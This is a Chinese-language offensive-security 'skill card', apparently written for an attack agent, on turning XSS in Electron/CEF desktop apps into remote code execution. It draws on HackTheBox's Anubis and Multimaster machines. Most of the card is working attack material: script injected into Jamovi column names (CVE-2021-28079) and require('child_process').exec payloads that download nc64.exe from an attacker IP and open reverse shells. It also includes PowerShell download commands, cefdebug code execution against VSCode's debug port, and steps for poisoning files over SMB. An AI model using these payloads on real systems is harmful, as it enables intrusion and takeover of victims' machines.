---
name: 'electron-desktop-app-attacks'
description: '目标把网页塞进 Electron/CEF 桌面壳里跑时:表格列名/字段标签一类"非内容"字段不转义 → XSS 直接升级成桌面端 RCE;或本机挂着 CEF/chromium 远程调试端口。看到 ElectronJS/CEF/cefdebug、nodeIntegration、preload 桥、column name 不转义就来查。（检索词：electron/Electron/ElectronJS/CEF/cefdebug/chromium/nodeIntegration/node-integration/node integration/column name/column-name/列名/字段标签/XSS to RCE/XSS-to-RCE/XSS 升级 RCE/XSS-升级-RCE/桌面应用/Electron 壳/Electron-壳/preload/contextIsolation/context-isolation/remote debugging/remote-debugging/远程调试/CEF debugger/desktop/app/attacks）'
whenToUse: '确认目标客户端是 Electron/CEF 打包(或机上跑着 VSCode/Jamovi 一类客户端)后加载;注入点不转义却打不出 RCE 时按本卡升级;纯浏览器 CDP 端口发现转 chrome-cdp-discovery'
metadata: { domain: web, tier: T3 }
---

# Electron / CEF 桌面应用攻击面:把 Web XSS 升级成桌面 RCE

> 来自 Insane 官方 WP 逐台回核,**2 台命中**:Anubis / Multimaster。

> 🔑 **先判「渲染这段 HTML 的是浏览器,还是带 Node 的桌面壳」。** 同一处不转义的 XSS,浏览器里只能偷 cookie,
> 在 Electron/CEF 渲染进程里 `<script>` 就能摸到 `require` → `child_process` = RCE。**Electron 里没有"低危 XSS"。**

## 触发信号

- `Program Files` 里装的是 **VSCode、Jamovi 一类 Electron 打包客户端**,`Get-Process` 能看到它在跑
- 应用处理的"文档"其实是 zip 容器:`.omv`(Jamovi) 解出来有 `metadata.json`
- 数据视图的**列名(column name)/字段标签**由服务端返回且从不转义 —— CVE-2021-28079 的注入点正在此处
- 页面脚本里 `require` / `process` / `process.mainModule` 直接可用 —— 🔴 开关名(`nodeIntegration: true` / `contextIsolation: false` / preload 暴露 `require`)是 **Electron 通用知识**,Anubis 的 WP 没写;判据只能是"payload 里的 `require(...)` 真的执行了"
- 本机 localhost 高位随机端口挂着 CEF debugger —— **VSCode 远程调试器默认开启**
- 入口是"客户端自动打开共享目录里某文件"的定时行为(该文件被定期更新 → 覆盖即投毒)

## 前置验证

```bash
Get-Process | findstr -i code   # Multimaster:确认 VSCode 进程在跑
dir "C:\Program Files"          # 确认 VSCode / Jamovi 安装
unzip Whatif.omv                # Anubis:解出 metadata.json,找 dataSet.fields[].name(会变成列名的字段)
```

## 模式 1: 注入点在"非内容"字段(列名 / 字段标签)

条件:应用把服务端/文件里的"列名"当元数据直接渲染进 DOM,且该位置不过 XSS 过滤。
Anubis 官方描述即 **"the column-name is vulnerable to XSS in the ElectronJS Framework, which could allow for remote code execution"**。

```bash
unzip Whatif.omv
# 改 metadata.json 第一个字段的 name(列名):
# "Sepal.Length <script>require('child_process').exec('curl 10.10.14.13/nc64.exe -o
#  /programdata/nc64.exe && /programdata/nc64.exe 10.10.14.13 7777 -e cmd')</script>"
zip Whatif.omv metadata.json
python3 -m http.server 80
nc -lnvp 7777
# 覆盖回共享目录,等客户端下次自动打开
proxychains smbclient //172.29.240.1/Shared -U localadmin
smb: \> cd Documents\
smb: \Documents\> cd Analytics\
smb: \Documents\Analytics\> put Whatif.omv
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Anubis | CVE-2021-28079(Jamovi <= 1.6.18,门户装的是 1.6.16.0)。`<script>require('child_process').exec(...)</script>` 写进 `Whatif.omv` 的 `metadata.json` 列名,覆盖 `\\172.29.240.1\Shared\Documents\Analytics\Whatif.omv`;几分钟后 `diegocruz` 在 host `earth` 回连,`C:\Users\diegocruz\desktop\user.txt` |

## 模式 2: Node 集成 / preload 桥 —— payload 直接 `require`

条件:渲染进程有 Node。`process.mainModule.require` 是 `require` 被隐藏时的备胎(两种写法都出自官方 WP)。

```js
require('child_process').exec('curl 10.10.14.13/nc64.exe -o /programdata/nc64.exe && /programdata/nc64.exe 10.10.14.13 7777 -e cmd')
process.mainModule.require('child_process').exec('powershell IWR -Uri http://10.10.14.10/nc.exe -Outfile c:\\windows\\temp\\test.exe')
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Anubis / Multimaster | Anubis 一条 payload 既下 `nc64.exe` 又起反向 shell;Multimaster 用 `IWR` 先落地 `c:\windows\temp\test.exe` 再单独起 shell(两段式便于排错) |

## 模式 3: CEF / chromium 远程调试端口(VSCode 默认开启)

条件:Electron/CEF 应用的远程调试器没关 —— **Multimaster 的关键点是"默认开启"**(Tavis Ormandy 的 advisory);`cefdebug` 即为交互/利用 electron、CEF、chromium 调试器而写。

```bash
wget https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip
unzip cefdebug.zip
# 用 Evil-WinRM 的 upload 把 cefdebug.exe 传上去;直接运行 → 列出监听 socket(本例识别出两个 CEF debugger)
.\cefdebug.exe --url ws://127.0.0.1:24891/256a9df8-f613-4ec0-a657-fa2de1ebe33f --code "process.mainModule.require('child_process').exec('powershell IWR -Uri http://10.10.14.10/nc.exe -Outfile c:\\windows\\temp\\test.exe')"
.\cefdebug.exe --url ws://127.0.0.1:24891/256a9df8-f613-4ec0-a657-fa2de1ebe33f --code "process.mainModule.require('child_process').exec('c:\\windows\\temp\\test.exe -e cmd.exe 10.10.14.10 1234')"
nc -lnvp 1234
```

> 随机高位端口 + `ws://` 带 UUID —— 纯浏览器的随机端口发现与 `/json` 探测见 `chrome-cdp-discovery`;本条是 CEF/Electron 侧特有的:`--code` 在渲染进程 eval,原语是 `process.mainModule.require`。
> ⚠️ WP 只**单独**给出 `process.mainModule.require(...IWR...)` 片段,以及第二条 `cefdebug.exe --code`(跑 `test.exe -e cmd.exe`);上面把 IWR 那条包进 `--code` 是**本卡的合理重建**,不是逐字引用。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Multimaster | VSCode 进程在跑且版本受"远程调试器默认开启"影响;`cefdebug.exe` 识别出两个 CEF debugger,在 `ws://127.0.0.1:24891/256a9df8-f613-4ec0-a657-fa2de1ebe33f` 上执行代码,`1234` 端口收 `cyork` 的 shell |

## 快速检查清单

```bash
[ ] 客户端是 Electron/CEF 打包(VSCode/Jamovi/…)且进程在跑?
[ ] 注入点是否在"非内容"字段(列名/字段标签/图例/导出名)?
[ ] 文档是 zip 容器?metadata.json 里哪个字段会变成列名?版本是否落在 CVE 影响范围内?
[ ] 覆盖后要等"客户端自动打开/刷新"的定时行为(不是立刻)
[ ] 本机高位端口有 CEF debugger → cefdebug.exe 列 socket
```

## 教训

1. **先判"渲染器有没有 Node",再找 payload** —— 这一步决定同一个 XSS 是低危还是 RCE。
2. **注入点常在"非内容"字段**:列名/字段标签这类元数据从来不过正文的 XSS 过滤器。
3. **打"客户端自动打开的文件"要接力定时行为**:Anubis 靠 `Whatif.omv` 被定期更新,覆盖后等几分钟才回连。

## 相关卡

- `chrome-cdp-discovery` —— 纯浏览器 CDP 随机端口发现 + `/json` API 操作;本卡模式 3 是 CEF/Electron 侧补充
- `web-chained-attacks` —— Electron RCE 只是链条中段时(Anubis 前面还有 ASP 代码注入 → Responder → 证书模板)
- `challenge-web-chain` —— XSS 只是客户端通道之一的 Insane Web 多级链
- `prototype-pollution` —— Electron 应用 Node 侧的另一条注入面
